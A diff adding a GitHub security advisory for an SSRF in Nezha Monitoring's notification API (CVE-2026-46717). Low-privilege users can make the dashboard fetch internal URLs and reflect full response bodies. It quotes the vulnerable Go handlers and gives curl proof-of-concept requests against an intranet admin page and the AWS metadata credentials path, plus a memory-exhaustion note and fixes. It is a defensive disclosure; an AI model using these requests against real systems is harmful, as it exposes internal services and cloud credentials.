@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-w4g9-mxgg-j532",
+  "modified": "2026-05-23T00:15:16.657332880Z",
+  "published": "2026-05-23T00:08:04Z",
+  "aliases": [
+    "CVE-2026-46717"
+  ],
+  "summary": "Nezha Monitoring: RoleMember-reachable SSRF with full response-body reflection via POST /api/v1/notification",
+  "details": "## Summary\n\nnezha's dashboard supports two user roles: `RoleAdmin` (Role==0) and `RoleMember` (Role==1). The notification routes `POST /api/v1/notification` and `PATCH /api/v1/notification/:id` are wired through `commonHandler` rather than `adminHandler` — so a `RoleMember` user can call them. These handlers synchronously `Send()` an HTTP request to a user-controlled URL and reflect the *entire* response body (no size limit) back to the caller on any non-2xx response.\n\nNet effect: a low-privilege `RoleMember` can read intranet HTTP response bodies via the dashboard's hub.\n\n## Affected versions\n\nCommit `50dc8e660326b9f22990898142c58b7a5312b42a` and earlier on `master`.\n\n## Reachability chain\n\n```\ncmd/dashboard/controller/controller.go:121-122\n    auth.GET(\"/notification\", listHandler(listNotification))\n    auth.POST(\"/notification\", commonHandler(createNotification))   // \u003c-- commonHandler, not adminHandler\n```\n\nFor comparison, `/user` routes ARE gated by `adminHandler`:\n\n```\nauth.GET(\"/user\", adminHandler(listUser))\nauth.POST(\"/user\", adminHandler(createUser))\nauth.POST(\"/batch-delete/user\", adminHandler(batchDeleteUser))\n```\n\n`adminHandler` (controller.go:220-236) explicitly enforces `user.Role.IsAdmin()`. `commonHandler` (controller.go:214-218) does not.\n\n## The vulnerable handler\n\n```go\n// cmd/dashboard/controller/notification.go:46-83\nfunc createNotification(c *gin.Context) (uint64, error) {\n    var nf model.NotificationForm\n    if err := c.ShouldBindJSON(\u0026nf); err != nil { return 0, err }\n    var n model.Notification\n    n.UserID = getUid(c)\n    n.Name = nf.Name\n    n.RequestMethod = nf.RequestMethod\n    n.RequestType = nf.RequestType\n    n.RequestHeader = nf.RequestHeader\n    n.RequestBody = nf.RequestBody\n    n.URL = nf.URL\n    ...\n    ns := model.NotificationServerBundle{Notification: \u0026n, Server: nil, Loc: singleton.Loc}\n    if !nf.SkipCheck {\n        if err := ns.Send(singleton.Localizer.T(\"a test message\")); err != nil {\n            return 0, err   // \u003c-- err.Error() reflects up to caller via newErrorResponse\n        }\n    }\n    ...\n}\n```\n\nIdentical pattern in `updateNotification` (PATCH /notification/:id) at lines 97-146.\n\n## The reflection sink\n\n```go\n// model/notification.go:113-159\nfunc (ns *NotificationServerBundle) Send(message string) error {\n    var client *http.Client\n    n := ns.Notification\n    if n.VerifyTLS != nil \u0026\u0026 *n.VerifyTLS {\n        client = utils.HttpClient\n    } else {\n        client = utils.HttpClientSkipTlsVerify\n    }\n    reqBody, err := ns.reqBody(message)\n    if err != nil { return err }\n    reqMethod, err := n.reqMethod()\n    if err != nil { return err }\n    req, err := http.NewRequest(reqMethod, ns.reqURL(message), strings.NewReader(reqBody))\n    if err != nil { return err }\n    n.setContentType(req)\n    if err := n.setRequestHeader(req); err != nil { return err }\n    resp, err := client.Do(req)\n    if err != nil { return err }\n    defer func() { _ = resp.Body.Close() }()\n    if resp.StatusCode \u003c 200 || resp.StatusCode \u003e 299 {\n        body, _ := io.ReadAll(resp.Body)   // \u003c-- NO io.LimitReader\n        return fmt.Errorf(\"%d@%s %s\", resp.StatusCode, resp.Status, string(body))\n    } else {\n        _, _ = io.Copy(io.Discard, resp.Body)\n    }\n    return nil\n}\n```\n\nThe full body (no size limit) is concatenated into an error string. That error flows through `commonHandler → handle() → newErrorResponse(err) → c.JSON(http.StatusOK, ...)`. The intranet response body is JSON-encoded back to the `RoleMember` caller.\n\nAdditional wrinkle: `client = utils.HttpClientSkipTlsVerify` when `VerifyTLS` is false — attacker-controlled. So the SSRF works against TLS endpoints too, ignoring cert validation.\n\n## PoC\n\n### A. Read intranet admin-panel response body\n\n```bash\ncurl -X POST -H \"Authorization: Bearer \u003cmember-jwt\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"x\",\"url\":\"http://192.168.1.1/admin/index.html\",\"request_method\":1,\"request_type\":1,\"verify_tls\":false,\"skip_check\":false}' \\\n  http://nezha-dashboard.example.com/api/v1/notification\n```\n\nResponse:\n```json\n{\"success\":false,\"error\":\"401@Unauthorized \u003cfull HTML body of the admin login page, no size limit\u003e\"}\n```\n\n### B. AWS IMDSv2 reachability + body leak\n\n```bash\ncurl -X POST -H \"Authorization: Bearer \u003cmember-jwt\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"x\",\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\"request_method\":1,\"request_type\":1,\"verify_tls\":false,\"skip_check\":false}' \\\n  http://nezha-dashboard.example.com/api/v1/notification\n```\n\nIMDSv2 returns 401 with a body explaining the missing token; that body is reflected.\n\n### C. DoS via large internal file\n\nBecause the body is read via unbounded `io.ReadAll`, a `RoleMember` pointing at any internal large-file URL (logs, package mirrors, video) blows up dashboard memory.\n\n## Suggested fix\n\n1. **Switch /notification routes to `adminHandler`.** Same fix for `/alert-rule`, `/cron`, `/ddns` if they also issue user-URL requests synchronously. Compare with how `/user` is already guarded.\n\n   ```go\n   auth.POST(\"/notification\", adminHandler(createNotification))\n   auth.PATCH(\"/notification/:id\", adminHandler(updateNotification))\n   ```\n\n2. **SSRF-harden `NotificationServerBundle.Send()`:**\n   - Resolve URL host once via `net.LookupIP`; refuse private/loopback/link-local/CGNAT.\n   - Pin `http.Transport.DialContext` to the resolved IP — closes DNS-rebinding TOCTOU.\n   - Refuse non-http(s) schemes.\n\n3. **Cap response body**: `io.LimitReader(resp.Body, 4096)`. 4 KB is plenty for surfacing webhook errors.\n\n4. **Reconsider `VerifyTLS=false` toggle on RoleMember-reachable paths** — if the route remains member-reachable, at minimum cert validation should be enforced.\n\n## Severity\n\n- **CVSS 3.1:** Medium — `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L` ≈ 6.4. PR:L because attacker needs a `RoleMember` account (admin-issued). C:L because intranet response bodies can be read but typically not full credentials. A:L because of the unbounded body-read DoS.\n- **Auth:** authenticated `RoleMember` (Role == 1).\n\n## Reproduction environment\n\n- Tested against: `nezhahq/nezha:v0.x` (commit `50dc8e660326b9f22990898142c58b7a5312b42a`).\n- Code locations:\n  - Handler: `cmd/dashboard/controller/notification.go:46-83, 97-146`\n  - Sink: `model/notification.go:113-159`\n  - Auth gate: `cmd/dashboard/controller/controller.go:121-122` (commonHandler), 214-236 (handler defs)\n\n## Reporter\n\nEddie Ran. Filed via reporter API (PVR enabled). nezha's `SECURITY.md` mentions email `hi@nai.ba` for vulnerability reports — happy to also send via email if the maintainer prefers.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/nezhahq/nezha",
+        "purl": "pkg:golang/github.com/nezhahq/nezha"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.4.0"
+            },
+            {
+              "fixed": "1.14.15-0.20260517022419-d06d539d34c1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-w4g9-mxgg-j532/GHSA-w4g9-mxgg-j532.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nezhahq/nezha/security/advisories/GHSA-w4g9-mxgg-j532"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nezhahq/nezha/commit/d06d539d34c143d842b91e2a64326e8c8f9bc405"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nezhahq/nezha"
+    }
+  ]
+}
